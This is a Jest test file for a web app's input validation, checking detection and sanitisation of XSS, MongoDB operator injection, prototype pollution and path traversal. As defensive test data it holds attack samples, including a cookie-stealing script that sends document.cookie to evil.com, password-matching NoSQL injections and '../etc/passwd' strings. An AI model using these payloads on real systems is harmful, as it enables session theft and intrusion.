/**
 * Input Validation Security Tests
 * Tests for XSS prevention, NoSQL injection prevention, and data type validation
 */

import { MongoMemoryServer } from 'mongodb-memory-server';
import mongoose from 'mongoose';

// Mock next-auth before importing modules that use it
jest.mock('next-auth', () => ({
  getServerSession: jest.fn(),
}));
jest.mock('next-auth/react');

// Import after mocking
import { getUserModel } from '@/lib/db/models/user';
import getPoolModel from '@/lib/db/models/pool';
import { isValidObjectId } from '@/lib/utils/objectId';

describe('Input Validation Security', () => {
  let mongoServer: MongoMemoryServer;

  beforeAll(async () => {
    mongoServer = await MongoMemoryServer.create();
    const uri = mongoServer.getUri();
    await mongoose.connect(uri);
  });

  afterAll(async () => {
    if (mongoose.connection.readyState !== 0) {
      await mongoose.disconnect();
    }
    if (mongoServer) {
      await mongoServer.stop();
    }
  });

  afterEach(async () => {
    const collections = mongoose.connection.collections;
    for (const key in collections) {
      await collections[key].deleteMany({});
    }
    jest.clearAllMocks();
  });

  describe('XSS Prevention', () => {
    const xssPayloads = [
      '<script>alert("xss")</script>',
      '"><img src=x onerror=alert(1)>',
      "javascript:alert('xss')",
      '<svg onload=alert(1)>',
      '<iframe src="javascript:alert(1)">',
      '"><script>document.location="http://evil.com?c="+document.cookie</script>',
      '<body onload=alert(1)>',
      '<input onfocus=alert(1) autofocus>',
      '<marquee onstart=alert(1)>',
      '<video><source onerror=alert(1)>',
    ];

    it('should identify XSS payloads in pool names', () => {
      // Test that XSS payloads are detectable
      const containsXss = (input: string): boolean => {
        const xssPatterns = [
          /<script[^>]*>/i,
          /onerror\s*=/i,
          /onload\s*=/i,
          /onfocus\s*=/i,
          /onclick\s*=/i,
          /onstart\s*=/i,
          /javascript:/i,
          /<iframe[^>]*>/i,
          /<svg[^>]*>/i,
          /<img[^>]*onerror/i,
          /<body[^>]*>/i,
          /<marquee[^>]*>/i,
          /<video[^>]*>/i,
          /<source[^>]*onerror/i,
        ];
        return xssPatterns.some((pattern) => pattern.test(input));
      };

      xssPayloads.forEach((payload) => {
        expect(containsXss(payload)).toBe(true);
      });
    });

    it('should sanitize HTML entities in user input', () => {
      const sanitizeHtml = (input: string): string => {
        return input
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;')
          .replace(/'/g, '&#039;');
      };

      const maliciousInput = '<script>alert("xss")</script>';
      const sanitized = sanitizeHtml(maliciousInput);

      expect(sanitized).not.toContain('<script>');
      expect(sanitized).toContain('&lt;script&gt;');
    });

    it('should strip dangerous HTML tags', () => {
      const stripDangerousTags = (input: string): string => {
        const dangerousPatterns = [
          /<script[^>]*>[\s\S]*?<\/script>/gi,
          /<iframe[^>]*>[\s\S]*?<\/iframe>/gi,
          /<object[^>]*>[\s\S]*?<\/object>/gi,
          /<embed[^>]*>/gi,
          /<link[^>]*>/gi,
        ];

        let result = input;
        dangerousPatterns.forEach((pattern) => {
          result = result.replace(pattern, '');
        });
        return result;
      };

      const inputWithScript = 'Hello <script>alert(1)</script> World';
      const stripped = stripDangerousTags(inputWithScript);

      expect(stripped).toBe('Hello  World');
      expect(stripped).not.toContain('script');
    });

    it('should remove event handlers from HTML', () => {
      const removeEventHandlers = (input: string): string => {
        return input.replace(/\s*on\w+\s*=\s*["'][^"']*["']/gi, '');
      };

      const inputWithEvents = '<img src="x" onerror="alert(1)">';
      const cleaned = removeEventHandlers(inputWithEvents);

      expect(cleaned).not.toContain('onerror');
      expect(cleaned).toContain('<img');
    });

    it('should validate URLs to prevent javascript: protocol', () => {
      const isSafeUrl = (url: string): boolean => {
        try {
          const parsed = new URL(url);
          return ['http:', 'https:'].includes(parsed.protocol);
        } catch {
          // Relative URLs are considered safe
          return !url.toLowerCase().startsWith('javascript:');
        }
      };

      expect(isSafeUrl('https://example.com')).toBe(true);
      expect(isSafeUrl('http://example.com')).toBe(true);
      expect(isSafeUrl('/relative/path')).toBe(true);
      expect(isSafeUrl('javascript:alert(1)')).toBe(false);
      expect(isSafeUrl('JAVASCRIPT:alert(1)')).toBe(false);
    });
  });

  describe('NoSQL Injection Prevention', () => {
    it('should validate MongoDB ObjectId format', () => {
      // Valid ObjectIds
      expect(isValidObjectId('507f1f77bcf86cd799439011')).toBe(true);
      expect(isValidObjectId(new mongoose.Types.ObjectId().toString())).toBe(true);

      // Invalid ObjectIds
      expect(isValidObjectId('invalid-id')).toBe(false);
      expect(isValidObjectId('123')).toBe(false);
      expect(isValidObjectId('')).toBe(false);
      expect(isValidObjectId(null as any)).toBe(false);
      expect(isValidObjectId(undefined as any)).toBe(false);
    });

    it('should detect MongoDB operator injection attempts', () => {
      const containsMongoOperator = (input: any): boolean => {
        if (typeof input !== 'object' || input === null) return false;

        const mongoOperators = [
          '$gt',
          '$gte',
          '$lt',
          '$lte',
          '$ne',
          '$in',
          '$nin',
          '$or',
          '$and',
          '$not',
          '$regex',
          '$where',
          '$exists',
          '$type',
          '$expr',
          '$jsonSchema',
          '$mod',
          '$text',
          '$elemMatch',
        ];

        const checkObject = (obj: any): boolean => {
          if (typeof obj !== 'object' || obj === null) return false;

          for (const key of Object.keys(obj)) {
            if (mongoOperators.includes(key)) return true;
            if (typeof obj[key] === 'object' && checkObject(obj[key])) return true;
          }
          return false;
        };

        return checkObject(input);
      };

      // Should detect injection attempts
      expect(containsMongoOperator({ $gt: '' })).toBe(true);
      expect(containsMongoOperator({ email: { $ne: null } })).toBe(true);
      expect(containsMongoOperator({ $or: [{ a: 1 }, { b: 2 }] })).toBe(true);
      expect(containsMongoOperator({ password: { $regex: '.*' } })).toBe(true);
      expect(containsMongoOperator({ $where: 'this.password.length > 0' })).toBe(true);

      // Should not flag normal objects
      expect(containsMongoOperator({ email: 'test@example.com' })).toBe(false);
      expect(containsMongoOperator({ name: 'Test User' })).toBe(false);
      expect(containsMongoOperator('string value')).toBe(false);
      expect(containsMongoOperator(null)).toBe(false);
    });

    it('should sanitize query parameters to prevent injection', () => {
      const sanitizeQueryParam = (param: any): string | null => {
        // Only allow string values for query parameters
        if (typeof param !== 'string') return null;
        // Remove any MongoDB operators that might be encoded
        if (param.includes('$')) return null;
        return param;
      };

      expect(sanitizeQueryParam('test@example.com')).toBe('test@example.com');
      expect(sanitizeQueryParam('normal-string')).toBe('normal-string');
      expect(sanitizeQueryParam({ $gt: '' })).toBeNull();
      expect(sanitizeQueryParam('$gt')).toBeNull();
      expect(sanitizeQueryParam(123)).toBeNull();
      expect(sanitizeQueryParam(['array'])).toBeNull();
    });

    it('should reject array injection in query params', () => {
      const isValidQueryParam = (param: any): boolean => {
        return typeof param === 'string' && !Array.isArray(param);
      };

      expect(isValidQueryParam('valid-string')).toBe(true);
      expect(isValidQueryParam(['array', 'injection'])).toBe(false);
      expect(isValidQueryParam({ object: 'injection' })).toBe(false);
    });

    it('should prevent prototype pollution', () => {
      const isSafeKey = (key: string): boolean => {
        const dangerousKeys = ['__proto__', 'constructor', 'prototype'];
        return !dangerousKeys.includes(key);
      };

      expect(isSafeKey('name')).toBe(true);
      expect(isSafeKey('email')).toBe(true);
      expect(isSafeKey('__proto__')).toBe(false);
      expect(isSafeKey('constructor')).toBe(false);
      expect(isSafeKey('prototype')).toBe(false);
    });
  });

  describe('Data Type Validation', () => {
    it('should validate email format', () => {
      const isValidEmail = (email: string): boolean => {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
      };

      expect(isValidEmail('test@example.com')).toBe(true);
      expect(isValidEmail('user.name@domain.co.uk')).toBe(true);
      expect(isValidEmail('not-an-email')).toBe(false);
      expect(isValidEmail('@missing-local.com')).toBe(false);
      expect(isValidEmail('missing-at-sign.com')).toBe(false);
      expect(isValidEmail('')).toBe(false);
    });

    it('should validate contribution amount as positive number', () => {
      const isValidContributionAmount = (amount: any): boolean => {
        if (typeof amount !== 'number') return false;
        if (isNaN(amount)) return false;
        if (!Number.isInteger(amount)) return false;
        if (amount < 1 || amount > 20) return false;
        return true;
      };

      expect(isValidContributionAmount(10)).toBe(true);
      expect(isValidContributionAmount(1)).toBe(true);
      expect(isValidContributionAmount(20)).toBe(true);
      expect(isValidContributionAmount(0)).toBe(false);
      expect(isValidContributionAmount(-5)).toBe(false);
      expect(isValidContributionAmount(21)).toBe(false);
      expect(isValidContributionAmount(10.5)).toBe(false);
      expect(isValidContributionAmount('10')).toBe(false);
      expect(isValidContributionAmount(NaN)).toBe(false);
    });

    it('should validate frequency enum values', () => {
      const validFrequencies = ['weekly', 'biweekly', 'monthly'];

      const isValidFrequency = (freq: string): boolean => {
        return validFrequencies.includes(freq.toLowerCase());
      };

      expect(isValidFrequency('weekly')).toBe(true);
      expect(isValidFrequency('biweekly')).toBe(true);
      expect(isValidFrequency('monthly')).toBe(true);
      expect(isValidFrequency('daily')).toBe(false);
      expect(isValidFrequency('invalid')).toBe(false);
      expect(isValidFrequency('')).toBe(false);
    });

    it('should validate payment method enum values', () => {
      const validPaymentMethods = ['venmo', 'cashapp', 'paypal', 'zelle'];

      const isValidPaymentMethod = (method: string): boolean => {
        return validPaymentMethods.includes(method.toLowerCase());
      };

      expect(isValidPaymentMethod('venmo')).toBe(true);
      expect(isValidPaymentMethod('cashapp')).toBe(true);
      expect(isValidPaymentMethod('paypal')).toBe(true);
      expect(isValidPaymentMethod('zelle')).toBe(true);
      expect(isValidPaymentMethod('crypto')).toBe(false);
      expect(isValidPaymentMethod('invalid')).toBe(false);
    });

    it('should validate pool name length constraints', () => {
      const isValidPoolName = (name: string): boolean => {
        if (typeof name !== 'string') return false;
        const trimmed = name.trim();
        return trimmed.length >= 1 && trimmed.length <= 100;
      };

      expect(isValidPoolName('My Pool')).toBe(true);
      expect(isValidPoolName('A')).toBe(true);
      expect(isValidPoolName('A'.repeat(100))).toBe(true);
      expect(isValidPoolName('')).toBe(false);
      expect(isValidPoolName('   ')).toBe(false);
      expect(isValidPoolName('A'.repeat(101))).toBe(false);
    });

    it('should validate date format', () => {
      const isValidDateString = (dateStr: string): boolean => {
        const date = new Date(dateStr);
        return !isNaN(date.getTime());
      };

      expect(isValidDateString('2026-01-15')).toBe(true);
      expect(isValidDateString('2026-01-15T12:00:00Z')).toBe(true);
      expect(isValidDateString(new Date().toISOString())).toBe(true);
      expect(isValidDateString('not-a-date')).toBe(false);
      expect(isValidDateString('')).toBe(false);
    });
  });

  describe('Request Body Validation', () => {
    it('should validate required fields in pool creation', () => {
      interface CreatePoolRequest {
        name?: string;
        contributionAmount?: number;
        totalRounds?: number;
        frequency?: string;
      }

      const validatePoolCreation = (body: CreatePoolRequest): string[] => {
        const errors: string[] = [];

        if (!body.name || typeof body.name !== 'string' || body.name.trim() === '') {
          errors.push('Pool name is required');
        }

        if (
          body.contributionAmount === undefined ||
          typeof body.contributionAmount !== 'number' ||
          isNaN(body.contributionAmount)
        ) {
          errors.push('Valid contribution amount is required');
        }

        if (
          body.totalRounds === undefined ||
          typeof body.totalRounds !== 'number' ||
          body.totalRounds <= 0
        ) {
          errors.push('Valid number of rounds is required');
        }

        return errors;
      };

      // Valid request
      expect(
        validatePoolCreation({
          name: 'Test Pool',
          contributionAmount: 10,
          totalRounds: 5,
          frequency: 'weekly',
        })
      ).toHaveLength(0);

      // Missing name
      expect(
        validatePoolCreation({
          contributionAmount: 10,
          totalRounds: 5,
        })
      ).toContain('Pool name is required');

      // Missing contribution amount
      expect(
        validatePoolCreation({
          name: 'Test Pool',
          totalRounds: 5,
        })
      ).toContain('Valid contribution amount is required');

      // Missing total rounds
      expect(
        validatePoolCreation({
          name: 'Test Pool',
          contributionAmount: 10,
        })
      ).toContain('Valid number of rounds is required');
    });

    it('should limit request body size', () => {
      const MAX_BODY_SIZE = 1024 * 1024; // 1MB

      const isValidBodySize = (body: string): boolean => {
        return body.length <= MAX_BODY_SIZE;
      };

      expect(isValidBodySize('{"name": "test"}')).toBe(true);
      expect(isValidBodySize('A'.repeat(MAX_BODY_SIZE))).toBe(true);
      expect(isValidBodySize('A'.repeat(MAX_BODY_SIZE + 1))).toBe(false);
    });
  });

  describe('Special Character Handling', () => {
    it('should handle Unicode characters safely', () => {
      const containsDangerousUnicode = (input: string): boolean => {
        // Check for null bytes and other control characters
        return /[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/.test(input);
      };

      expect(containsDangerousUnicode('Normal text')).toBe(false);
      expect(containsDangerousUnicode('Text with émojis 👍')).toBe(false);
      expect(containsDangerousUnicode('日本語テキスト')).toBe(false);
      expect(containsDangerousUnicode('Text\x00with\x00nulls')).toBe(true);
    });

    it('should handle path traversal attempts', () => {
      const containsPathTraversal = (input: string): boolean => {
        return /\.\.\/|\.\.\\|%2e%2e%2f|%2e%2e\\/i.test(input);
      };

      expect(containsPathTraversal('../etc/passwd')).toBe(true);
      expect(containsPathTraversal('..\\windows\\system32')).toBe(true);
      expect(containsPathTraversal('%2e%2e%2fetc/passwd')).toBe(true);
      expect(containsPathTraversal('normal/path/file.txt')).toBe(false);
    });
  });
});
